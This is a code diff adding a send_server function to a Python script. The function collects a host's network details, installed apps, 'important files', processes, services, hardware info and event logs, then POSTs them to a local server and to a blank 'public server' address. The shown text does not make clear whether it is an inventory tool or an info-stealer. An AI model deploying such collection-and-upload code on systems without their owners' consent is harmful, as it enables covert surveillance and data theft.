@@ -1,4 +1,4 @@
-import subprocess, smtplib, socket, platform, os
+import subprocess, smtplib, socket, platform, os, requests
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 
@@ -101,9 +101,40 @@ def send_mailersend(sender_email, sender_pass, recipient_email):
     except Exception as e:
         print(f"Failed to send email: {e}")
 
+#Send info to (local) server
+def send_server(server_domip, use_json=True):
+    data = {
+        "network_info": get_net_info(),
+        "installed_apps": get_installed_apps(),
+        "important_files": get_important_files(),
+        "running_processes": get_running_processes(),
+        "running_services": get_running_services(),
+        "hardware_info": get_hardware_info(),
+        "event_logs": get_event_logs()
+    }
+
+    try:
+        if use_json:
+            response = requests.post(server_domip, json=data)
+        else:
+            response = requests.post(server_domip, data={"report": email_body()})
+        
+        if response.status_code == 200:
+            print("Info successfully sent to server.")
+        else:
+            print(f"Failed to send data. Status code: {response.status_code}")
+    except Exception as e:
+        print(f"Error sending data to server: {e}")            
+
 if __name__ == "__main__":
     sender_email = ""
     sender_pass = ""
     recipient_email = ""
 
     send_mailersend(sender_email, sender_pass, recipient_email)
+
+    local_server_domip = "http://localhost:5000/dolometis"
+    send_server(local_server_domip, use_json=True)
+    #Public server
+    public_server_domip = ""
+    send_server(public_server_domip, use_json=True)
